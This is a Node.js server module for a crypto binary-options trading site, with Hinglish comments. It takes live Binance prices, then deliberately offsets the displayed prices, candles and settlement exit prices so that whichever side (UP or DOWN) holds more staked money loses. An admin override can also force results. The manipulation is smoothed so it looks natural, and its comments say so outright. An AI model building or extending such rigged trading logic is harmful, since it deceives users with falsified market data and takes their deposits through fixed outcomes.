const jwt = require("jsonwebtoken");
const mongoose = require("mongoose");
const WebSocket = require('ws'); 
const AdminCopyTrade = require('./models/AdminCopyTrade');

// Global reference for marketData
let globalMarketData = {};

// Store Live 24h Percentage from WebSocket
let last24hTickerData = {};

// =====================================================================
// ✅ Per-pair target offset store karo
//    yeh aggTrade pe price ko smoothly us direction mein le jaata hai
// =====================================================================
const currentOffsets = {};   // har pair ka current active offset
const lastAggTimes   = {};   // last aggTrade timestamp per pair

// Copy Trade Execution Logic
async function executeCopyTrade(io, User, Trade, copyTradeId) {
    const session = await mongoose.startSession();
    session.startTransaction();
    try {
        const copyTrade = await AdminCopyTrade.findById(copyTradeId)
            .populate('userCopies.userId')
            .session(session);
        if (!copyTrade || copyTrade.status !== 'active') {
            await session.abortTransaction(); session.endSession(); return;
        }
        copyTrade.status = 'executed';
        await copyTrade.save({ session });
        await session.commitTransaction(); session.endSession();
    } catch (error) {
        await session.abortTransaction(); session.endSession();
    }
}

// Auto-cleanup expired copy trades
async function cleanupExpiredCopyTrades(io, User, Trade) {
    try {
        const now = new Date();
        const expiredTrades = await AdminCopyTrade.find({
            status: 'active', executionTime: { $lte: now }
        }).lean();
        for (const copyTrade of expiredTrades) {
            try { await executeCopyTrade(io, User, Trade, copyTrade._id); } catch (e) {}
        }
    } catch (error) {}
}

// =====================================================================
// ✅ Decide karo target offset kya hona chahiye
//
//    forceOverride = 'up'   → candle upar jaaye  (UP wins)
//    forceOverride = 'down' → candle neeche jaaye (DOWN wins)
//    no force               → dominant volume side lose kare
// =====================================================================
async function computeTargetOffset(Trade, pair, realPrice, forceOverride) {
    const MOVE = realPrice * 0.0012; // 0.12% — visible lekin natural

    if (forceOverride === 'up')   return  MOVE;   // price upar
    if (forceOverride === 'down') return -MOVE;   // price neeche

    // Volume check
    try {
        const volumeData = await Trade.aggregate([
            { $match: { asset: pair, status: { $in: ["active","pending","scheduled"] } } },
            { $group: { _id: '$direction', totalVolume: { $sum: '$amount' } } }
        ]);
        let upVol = 0, downVol = 0;
        volumeData.forEach(v => {
            if (v._id === 'UP')   upVol   = v.totalVolume;
            if (v._id === 'DOWN') downVol = v.totalVolume;
        });
        if (upVol === 0 && downVol === 0) return 0;
        if (upVol > downVol)  return -MOVE;  // UP dominant → price neeche → UP loses
        if (downVol > upVol)  return  MOVE;  // DOWN dominant → price upar → DOWN loses
    } catch(e) {}

    return 0;
}

// --- WEBSOCKET TRADE MONITORING ---
function runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS) {
    const lastProcessedCompletedCandleTs = {};
    const lastProcessedActivationTs      = {};
    let   lastCopyTradeCleanup = Date.now();

    let indexModule = {};
    try { indexModule = require('./index'); }
    catch (e) { console.warn("Could not load index.js for overrides."); }

    const streams = TRADE_PAIRS
        .map(p => `${p.toLowerCase()}@kline_1m/${p.toLowerCase()}@aggTrade/${p.toLowerCase()}@ticker`)
        .join('/');
    const wsUrl = `wss://stream.binance.com:9443/stream?streams=${streams}`;
    let ws = new WebSocket(wsUrl);

    ws.on('open', () => console.log('✅ Connected to Binance WebSockets'));

    ws.on('message', async (message) => {
        try {
            const parsedRaw = JSON.parse(message);
            const parsed = parsedRaw.data ? parsedRaw.data : parsedRaw;
            if (!parsed) return;

            let overrides = {};
            try { overrides = indexModule.candleOverride || {}; } catch(e) {}

            // -----------------------------------------------------------
            // 1. 24h TICKER — percentage update
            // -----------------------------------------------------------
            if (parsed.e === '24hrTicker') {
                last24hTickerData[parsed.s] = parseFloat(parsed.P);
            }

            // -----------------------------------------------------------
            // 2. aggTrade — LIVE PRICE (manipulation offset apply karo)
            // -----------------------------------------------------------
            else if (parsed.e === 'aggTrade') {
                const pair       = parsed.s;
                const realPrice  = parseFloat(parsed.p);
                const binanceTime= parsed.E;

                // Current override fetch karo
                const forceOverride = overrides[pair] || null;

                // Target offset compute karo (async)
                const targetOffset = await computeTargetOffset(Trade, pair, realPrice, forceOverride);

                // Smoothly current offset ko target ki taraf le jao
                const SMOOTHING_MS   = 8000;   // 8 seconds mein poora move
                const timeDiff       = binanceTime - (lastAggTimes[pair] || binanceTime);
                lastAggTimes[pair]   = binanceTime;

                if (currentOffsets[pair] === undefined) currentOffsets[pair] = 0;

                const speedPerMs = Math.abs(realPrice * 0.0012) / SMOOTHING_MS;
                const step       = speedPerMs * Math.min(timeDiff, 500); // max 500ms step

                if (currentOffsets[pair] < targetOffset) {
                    currentOffsets[pair] = Math.min(currentOffsets[pair] + step, targetOffset);
                } else if (currentOffsets[pair] > targetOffset) {
                    currentOffsets[pair] = Math.max(currentOffsets[pair] - step, targetOffset);
                }

                // Manipulated price
                const displayPrice = realPrice + currentOffsets[pair];

                if (!globalMarketData[pair]) {
                    globalMarketData[pair] = { candles: [], currentCandle: null, lastEmit: 0 };
                }
                globalMarketData[pair].currentPrice = displayPrice;

                const now = Date.now();
                if (now - (globalMarketData[pair].lastEmit || 0) > 200) {
                    // Trade page ko manipulated price bhejo
                    io.emit('price_update', { pair, price: displayPrice, timestamp: binanceTime });

                    // Dashboard ko bhi same manipulated price
                    const formattedPair = pair.replace('USDT', '/USDT');
                    io.emit('dashboard_price_update', {
                        [formattedPair]: {
                            price: displayPrice,
                            change: last24hTickerData[pair] || 0
                        }
                    });
                    globalMarketData[pair].lastEmit = now;
                }
            }

            // -----------------------------------------------------------
            // 3. kline — CANDLESTICK (manipulated prices se banao)
            // -----------------------------------------------------------
            else if (parsed.e === 'kline') {
                const pair = parsed.s;
                const k    = parsed.k;

                const activeOffset = currentOffsets[pair] || 0;

                // Real Binance prices
                const realOpen  = parseFloat(k.o);
                const realClose = parseFloat(k.c);
                const realHigh  = parseFloat(k.h);
                const realLow   = parseFloat(k.l);

                // Manipulated prices — offset add karo
                let openPrice  = realOpen  + activeOffset;
                let closePrice = realClose + activeOffset;
                let highPrice  = realHigh  + activeOffset;
                let lowPrice   = realLow   + activeOffset;

                // Open price previous close se match karo (gap na aaye)
                if (
                    globalMarketData[pair] &&
                    globalMarketData[pair].candles &&
                    globalMarketData[pair].candles.length > 0
                ) {
                    openPrice = globalMarketData[pair].candles[globalMarketData[pair].candles.length - 1].close;
                }

                // High/Low recalculate (open/close ke baad)
                highPrice = Math.max(highPrice, openPrice, closePrice);
                lowPrice  = Math.min(lowPrice,  openPrice, closePrice);

                const candleObj = {
                    timestamp: new Date(k.t),
                    open:  openPrice,
                    high:  highPrice,
                    low:   lowPrice,
                    close: closePrice,
                    isClosed: k.x
                };

                if (!globalMarketData[pair]) globalMarketData[pair] = { candles: [], currentCandle: null };
                globalMarketData[pair].currentCandle = candleObj;

                // Activation — candle shuru hote hi trades activate
                const activationTs = candleObj.timestamp.getTime();
                if (!lastProcessedActivationTs[pair] || lastProcessedActivationTs[pair] < activationTs) {
                    await activateScheduledTradesForPair(io, Trade, pair, candleObj.timestamp, openPrice);
                    await activatePendingTradesForPair(io, User, Trade, pair, candleObj.timestamp, openPrice);
                    lastProcessedActivationTs[pair] = activationTs;
                }

                // Candle close hone par settlement
                if (k.x) {
                    if (!globalMarketData[pair].candles) globalMarketData[pair].candles = [];
                    globalMarketData[pair].candles.push(candleObj);
                    if (globalMarketData[pair].candles.length > 50) globalMarketData[pair].candles.shift();

                    const lastCompletedTs = candleObj.timestamp.getTime();
                    if (!lastProcessedCompletedCandleTs[pair] || lastProcessedCompletedCandleTs[pair] < lastCompletedTs) {

                        // Override fetch karo settlement se pehle
                        let currentOverride = null;
                        try { currentOverride = (indexModule.candleOverride && indexModule.candleOverride[pair]) || null; }
                        catch(e) {}

                        // ✅ Manipulated close price se settle karo
                        await settleActiveTradesForPair(io, User, Trade, pair, candleObj, currentOverride);
                        lastProcessedCompletedCandleTs[pair] = lastCompletedTs;

                        // Override clear karo
                        try {
                            if (indexModule.candleOverride && indexModule.candleOverride[pair]) {
                                indexModule.candleOverride[pair] = null;
                            }
                        } catch(e) {}

                        // Offset reset karo candle close ke baad
                        currentOffsets[pair] = 0;
                    }
                }

                const now = Date.now();
                if ((now - lastCopyTradeCleanup) > 5000) {
                    await cleanupExpiredCopyTrades(io, User, Trade);
                    lastCopyTradeCleanup = now;
                }
            }
        } catch (error) {
            console.error('WebSocket message processing error:', error);
        }
    });

    ws.on('close', () => {
        console.log('⚠️ Binance WebSocket Disconnected. Reconnecting in 3 seconds...');
        setTimeout(() => runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS), 3000);
    });

    ws.on('error', (err) => {
        console.error('Binance WebSocket Error:', err.message);
    });
}

async function initialize(io, User, Trade, marketData, TRADE_PAIRS) {
    globalMarketData = marketData;
    io.engine.marketData = marketData;

    io.use((socket, next) => {
        try {
            let token = socket.handshake.auth?.token;
            if (!token) {
                const authHeader = socket.handshake.headers.authorization;
                if (authHeader && authHeader.startsWith('Bearer ')) token = authHeader.substring(7);
            }
            if (!token) return next(new Error("Authentication error: No token"));
            jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
                if (err) return next(new Error("Authentication error: Invalid token"));
                socket.decoded = decoded;
                next();
            });
        } catch (err) {
            return next(new Error("Authentication error"));
        }
    });

    runTradeMonitorWithWebsockets(io, User, Trade, TRADE_PAIRS);

    io.on("connection", async (socket) => {
        try {
            const userId = socket.decoded.id;
            const user = await User.findById(userId);
            if (!user) return socket.disconnect();
            socket.join(user._id.toString());

            const userTrades = await Trade.find({ userId: user._id }).sort({ timestamp: -1 }).limit(50);
            socket.emit("init", {
                balance: user.balance,
                tradeHistory: userTrades,
                marketData: globalMarketData
            });

            // DASHBOARD DATA
            socket.on('request_dashboard_data', async () => {
                try {
                    const freshUser = await User.findById(userId);
                    if (!freshUser) return;

                    const today = new Date(); today.setHours(0,0,0,0);
                    const tomorrow = new Date(today); tomorrow.setDate(tomorrow.getDate() + 1);

                    const todayTrades = await Trade.find({
                        userId: freshUser._id, status: "closed",
                        closeTime: { $gte: today, $lt: tomorrow }
                    });
                    const todayPnl = todayTrades.reduce((sum, t) => sum + (t.pnl || 0), 0);

                    const assetsInfo = [
                        { ticker: 'BTC/USDT',  name: 'Bitcoin' },
                        { ticker: 'ETH/USDT',  name: 'Ethereum' },
                        { ticker: 'BNB/USDT',  name: 'Binance Coin' },
                        { ticker: 'SOL/USDT',  name: 'Solana' },
                        { ticker: 'XRP/USDT',  name: 'Ripple' },
                        { ticker: 'ADA/USDT',  name: 'Cardano' },
                        { ticker: 'DOGE/USDT', name: 'Dogecoin' },
                        { ticker: 'AVAX/USDT', name: 'Avalanche' },
                        { ticker: 'LINK/USDT', name: 'Chainlink' },
                        { ticker: 'MATIC/USDT',name: 'Polygon' }
                    ];

                    const assets = assetsInfo.map(info => {
                        const rawPair = info.ticker.replace('/', '');
                        return {
                            ticker: info.ticker,
                            name: info.name,
                            price: globalMarketData[rawPair]?.currentPrice || 0,
                            change: last24hTickerData[rawPair] || 0
                        };
                    });

                    socket.emit('dashboard_data', {
                        success: true,
                        data: { username: freshUser.username, balance: freshUser.balance, todayPnl, assets }
                    });
                } catch (error) { console.error("Dashboard Data Error:", error); }
            });

            socket.on("trade", async (data) => {
                try {
                    const { asset, direction, amount } = data;
                    if (!TRADE_PAIRS.includes(asset)) return socket.emit("error", { message: "Invalid asset." });
                    if (!["UP","DOWN"].includes(direction)) return socket.emit("error", { message: "Invalid direction." });

                    const existingTrade = await Trade.findOne({
                        userId: user._id, status: { $in: ["pending","active","scheduled"] }
                    });
                    if (existingTrade) return socket.emit("error", { message: "You already have an active trade. Please wait for it to complete." });

                    const tradeAmount = parseFloat(amount);
                    if (isNaN(tradeAmount) || tradeAmount <= 0) return socket.emit("error", { message: "Invalid trade amount." });

                    const freshUser = await User.findById(user._id);
                    if (freshUser.balance < tradeAmount) return socket.emit("error", {
                        message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}`
                    });

                    freshUser.balance -= tradeAmount;
                    await freshUser.save();

                    const trade = new Trade({
                        userId: user._id, amount: tradeAmount,
                        direction: direction, // ✅ Original direction — manipulation settlement pe
                        asset, status: "pending", timestamp: new Date()
                    });
                    await trade.save();

                    io.to(user._id.toString()).emit("trade_pending", { trade, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not place trade." });
                }
            });

            socket.on("copy_trade", async (data) => {
                const session = await mongoose.startSession();
                session.startTransaction();
                try {
                    const { copyTradeId } = data;
                    const freshUser = await User.findById(userId).session(session);
                    if (!freshUser || freshUser.balance < 100) {
                        await session.abortTransaction(); session.endSession();
                        return socket.emit("error", { message: "Minimum $100 balance required to copy trades" });
                    }

                    const existingTrade = await Trade.findOne({
                        userId: user._id, status: { $in: ["pending","active","scheduled"] }
                    }).session(session);
                    if (existingTrade) {
                        await session.abortTransaction(); session.endSession();
                        return socket.emit("error", { message: "You already have an active trade. Please wait for it to complete before copying." });
                    }

                    const copyTrade = await AdminCopyTrade.findById(copyTradeId).session(session);
                    if (!copyTrade || copyTrade.status !== 'active' || copyTrade.executionTime <= new Date()) {
                        await session.abortTransaction(); session.endSession();
                        return socket.emit("error", { message: "This copy trade is no longer available" });
                    }

                    const alreadyCopied = copyTrade.userCopies.find(c => c.userId.toString() === userId);
                    if (alreadyCopied) {
                        await session.abortTransaction(); session.endSession();
                        return socket.emit("error", { message: "You have already copied this trade" });
                    }

                    const tradeAmount = (freshUser.balance * copyTrade.percentage) / 100;
                    if (freshUser.balance < tradeAmount) {
                        await session.abortTransaction(); session.endSession();
                        return socket.emit("error", {
                            message: `Insufficient balance. Required: $${tradeAmount.toFixed(2)}, Available: $${freshUser.balance.toFixed(2)}`
                        });
                    }

                    const executionTime = new Date(copyTrade.executionTime);
                    executionTime.setSeconds(0, 0);

                    const scheduledTrade = new Trade({
                        userId: user._id, amount: tradeAmount,
                        direction: copyTrade.direction === 'CALL' ? 'UP' : 'DOWN',
                        asset: copyTrade.tradingPair, status: "scheduled",
                        scheduledTime: executionTime, timestamp: new Date(),
                        isCopyTrade: true, originalCopyTradeId: copyTrade._id
                    });

                    freshUser.balance -= tradeAmount;
                    copyTrade.userCopies.push({ userId, copiedAt: new Date(), tradeAmount });

                    await scheduledTrade.save({ session });
                    await copyTrade.save({ session });
                    await freshUser.save({ session });
                    await session.commitTransaction(); session.endSession();

                    const timeUntilExecution = executionTime - new Date();
                    const minutesUntilExecution = Math.floor(timeUntilExecution / 60000);

                    socket.emit("copy_trade_success", {
                        message: `Successfully copied! $${tradeAmount.toFixed(2)} executes in ${minutesUntilExecution} minutes.`,
                        copyTrade: {
                            tradingPair: copyTrade.tradingPair, direction: copyTrade.direction,
                            percentage: copyTrade.percentage, executionTime,
                            tradeAmount, minutesUntilExecution
                        },
                        scheduledTrade
                    });
                    io.to(user._id.toString()).emit("trade_scheduled", { trade: scheduledTrade, balance: freshUser.balance });

                } catch (error) {
                    await session.abortTransaction(); session.endSession();
                    socket.emit("error", { message: "Failed to copy trade" });
                }
            });

            socket.on("cancel_trade", async (data) => {
                try {
                    const trade = await Trade.findOne({
                        _id: data.tradeId, userId: user._id, status: { $in: ["pending","scheduled"] }
                    });
                    if (!trade) return socket.emit("error", { message: "Trade not found or cannot be cancelled." });

                    const freshUser = await User.findById(user._id);
                    freshUser.balance += trade.amount;
                    await freshUser.save();
                    trade.status = "cancelled";
                    await trade.save();
                    io.to(user._id.toString()).emit("trade_cancelled", { tradeId: trade._id, balance: freshUser.balance });
                } catch (err) {
                    socket.emit("error", { message: "Could not cancel trade." });
                }
            });

            socket.on("disconnect", () => {});
        } catch (err) {
            socket.disconnect();
        }
    });
}

// --- Activation Helpers ---
async function activateScheduledTradesForPair(io, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const candleTime = new Date(candleTimestamp); candleTime.setSeconds(0, 0);
        const scheduleds = await Trade.find({ status: "scheduled", asset: pair, scheduledTime: { $lte: candleTime } });
        for (const t of scheduleds) {
            t.status = "active"; t.entryPrice = entryPrice; t.activationTimestamp = candleTime;
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

async function activatePendingTradesForPair(io, User, Trade, pair, candleTimestamp, entryPrice) {
    try {
        const pendings = await Trade.find({ status: "pending", asset: pair });
        for (const t of pendings) {
            t.status = "active"; t.entryPrice = entryPrice; t.activationTimestamp = candleTimestamp;
            await t.save();
            io.to(t.userId.toString()).emit("trade_active", { trade: t });
        }
    } catch (err) {}
}

// =====================================================================
// ✅ SETTLEMENT — candle ka jo close price hai (already manipulated)
//    usse hi result decide karo. Alag se kuch calculate nahi.
// =====================================================================
async function settleActiveTradesForPair(io, User, Trade, pair, lastCompletedCandle, forceOverride) {
    const completedCandleStartTime  = new Date(lastCompletedCandle.timestamp).getTime();
    const settlementEligibilityTime = completedCandleStartTime + 60000;

    try {
        const actives = await Trade.find({ status: "active", asset: pair });
        if (actives.length === 0) return;

        // Candle ka close price already manipulated hai (aggTrade offset se)
        // Agar override hai toh ek final push karo sahi direction mein
        let finalExitPrice = lastCompletedCandle.close;
        const entryRef = actives[0]?.entryPrice || lastCompletedCandle.open;
        const MOVE = entryRef * 0.0012;

        if (forceOverride === 'up') {
            // Ensure close > entry — guarantee green candle
            if (finalExitPrice <= entryRef) {
                finalExitPrice = entryRef + MOVE;
            }
            console.log(`[${pair}] Force UP — final exit: ${finalExitPrice.toFixed(5)}`);

        } else if (forceOverride === 'down') {
            // Ensure close < entry — guarantee red candle
            if (finalExitPrice >= entryRef) {
                finalExitPrice = entryRef - MOVE;
            }
            console.log(`[${pair}] Force DOWN — final exit: ${finalExitPrice.toFixed(5)}`);

        } else {
            // Volume check — dominant side lose kare
            let upVol = 0, downVol = 0;
            actives.forEach(t => {
                const closeBy = new Date(t.activationTimestamp).getTime() + 60000;
                if (closeBy <= settlementEligibilityTime) {
                    if (t.direction === 'UP')   upVol   += t.amount;
                    else                         downVol += t.amount;
                }
            });

            if (upVol > downVol) {
                // UP dominant → UP lose → close < entry
                if (finalExitPrice >= entryRef) finalExitPrice = entryRef - MOVE;
                console.log(`[${pair}] Vol: UP dominant → exit LOW ${finalExitPrice.toFixed(5)}`);
            } else if (downVol > upVol) {
                // DOWN dominant → DOWN lose → close > entry
                if (finalExitPrice <= entryRef) finalExitPrice = entryRef + MOVE;
                console.log(`[${pair}] Vol: DOWN dominant → exit HIGH ${finalExitPrice.toFixed(5)}`);
            }
            // equal → real close use karo
        }

        // Sab eligible trades settle karo
        for (const t of actives) {
            const closeBy = new Date(t.activationTimestamp).getTime() + 60000;
            if (closeBy > settlementEligibilityTime) continue;

            const win = (t.direction === "UP"   && finalExitPrice > t.entryPrice) ||
                        (t.direction === "DOWN"  && finalExitPrice < t.entryPrice);
            const tie = Math.abs(finalExitPrice - t.entryPrice) < 0.000001;
            const pnl = tie ? 0 : (win ? t.amount * 0.9 : -t.amount);

            t.status    = "closed";
            t.exitPrice = finalExitPrice;
            t.result    = tie ? "TIE" : (win ? "WIN" : "LOSS");
            t.pnl       = pnl;
            t.closeTime = new Date();
            await t.save();

            const userAfter = await User.findByIdAndUpdate(
                t.userId,
                { $inc: { balance: t.amount + pnl, totalTradeVolume: t.amount } },
                { new: true }
            );

            const today = new Date(); today.setHours(0,0,0,0);
            const tomorrow = new Date(today); tomorrow.setDate(tomorrow.getDate() + 1);
            const todayTrades = await Trade.find({
                userId: t.userId, status: "closed",
                closeTime: { $gte: today, $lt: tomorrow }
            });
            const todayPnl = todayTrades.reduce((sum, tr) => sum + (tr.pnl || 0), 0);

            io.to(t.userId.toString()).emit("trade_result", {
                trade: t, balance: userAfter.balance,
                todayPnl: parseFloat(todayPnl.toFixed(2))
            });

            console.log(`[${pair}] ${t.direction} | entry=${t.entryPrice?.toFixed(5)} | exit=${finalExitPrice.toFixed(5)} | ${t.result} | pnl=${pnl.toFixed(2)}`);
        }
    } catch (err) {
        console.error('settleActiveTradesForPair error:', err);
    }
}

module.exports = { initialize };
